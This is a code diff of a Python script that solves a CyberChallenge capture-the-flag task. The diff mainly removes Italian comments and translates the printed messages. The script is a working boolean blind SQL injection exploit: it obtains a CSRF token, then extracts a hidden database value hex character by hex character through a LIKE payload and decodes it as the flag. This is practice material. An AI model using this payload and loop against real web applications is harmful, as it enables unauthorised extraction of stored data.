@@ -1,13 +1,9 @@
 import requests
-import binascii
 
-# ==============================================================================
-# CLASSE FORNITA DALLA CHALLENGE (Gestione Sessione e Token API)
-# ==============================================================================
+
 class Inj:
     def __init__(self, host):
         self.sess = requests.Session()
-        # Assicuriamoci che l'URL sia formattato correttamente
         host = host.rstrip('/')
         self.base_url = f'{host}/api/'
         self._refresh_csrf_token()
@@ -19,7 +15,6 @@ class Inj:
     def _do_raw_req(self, url, query):
         headers = {'X-CSRFToken': self.token}
         data = {'query': query}
-        # Aggiunto un timeout di 10 secondi per evitare blocchi di rete
         return self.sess.post(url, json=data, headers=headers, timeout=10).json()
 
     def blind(self, query):
@@ -27,59 +22,41 @@ class Inj:
         response = self._do_raw_req(url, query)
         return response['result'], response.get('sql_error', '')
 
-# ==============================================================================
-# SCRIPT DI ATTACCO BLIND SQLi (Hex-Encoded)
-# ==============================================================================
 
-# 1. Inizializziamo l'oggetto puntando al server della challenge
 host = 'http://sqlinjection.challs.cyberchallenge.it'
-print(f"[*] Connessione a {host} per ottenere il token CSRF...")
+print(f"[*] Connecting to {host} ...")
 try:
     inj = Inj(host)
-    print("[+] Token ottenuto! Avvio estrazione Blind SQLi...")
+    print("[+] Token obtained. Starting blind SQLi extraction...")
 except Exception as e:
-    print(f"[-] Errore di connessione o risoluzione DNS. Controlla la rete/VPN della VM!\nDettagli: {e}")
+    print(f"[-] Connection error. Check the VM network/VPN.\nDetails: {e}")
     exit(1)
 
-# 2. Impostiamo il payload e il dizionario Esadecimale fornito dalle istruzioni
 payload = "1' and (select 1 from secret where HEX(asecret) LIKE '{}%')='1"
 dictionary = '0123456789abcdef'
 result = ''
 
-# 3. Ciclo di estrazione
 while True:
     for c in dictionary:
-        # Costruiamo la query concatenando ciò che abbiamo già trovato con la nuova lettera
         question = payload.format(result + c)
-        
-        # Stampiamo a video il tentativo in tempo reale
-        print(f"[*] Test stringa HEX: {result + c}", end='\r')
-        
-        # Interroghiamo l'API
+        print(f"[*] Testing HEX string: {result + c}", end='\r')
         response, error = inj.blind(question)
-        
         if response == 'Success':
             result += c
-            print(f"\n[+] Trovato match HEX parziale: {result}")
-            break # Usciamo dal ciclo 'for' per ricominciare il 'while' con la lettera successiva
-            
+            print(f"\n[+] Partial HEX match: {result}")
+            break
     else:
-        # Questo blocco 'else' appartiene al 'for', non all'if!
-        # Si attiva solo se il ciclo for termina TUTTO il dizionario senza fare 'break'.
-        # Significa che non ci sono più lettere da trovare: abbiamo l'intera stringa!
-        break 
+        break
 
-print(f"\n\n[*] Estrazione Hex completata: {result}")
+print(f"\n\n[*] HEX extraction complete: {result}")
 
-# 4. Convertiamo la stringa Esadecimale estratta in testo leggibile (ASCII)
 if result:
     try:
-        # bytes.fromhex decodifica l'hex, .decode() lo trasforma in stringa di testo
         flag = bytes.fromhex(result).decode('utf-8')
-        print("="*50)
-        print(f"[!] FLAG DECIFRATA: {flag}")
-        print("="*50)
+        print("=" * 50)
+        print(f"[!] FLAG: {flag}")
+        print("=" * 50)
     except Exception as e:
-        print(f"[-] Errore nella conversione in testo leggibile: {e}")
+        print(f"[-] Conversion error: {e}")
 else:
-    print("[-] Nessun dato estratto.")
+    print("[-] No data extracted.")
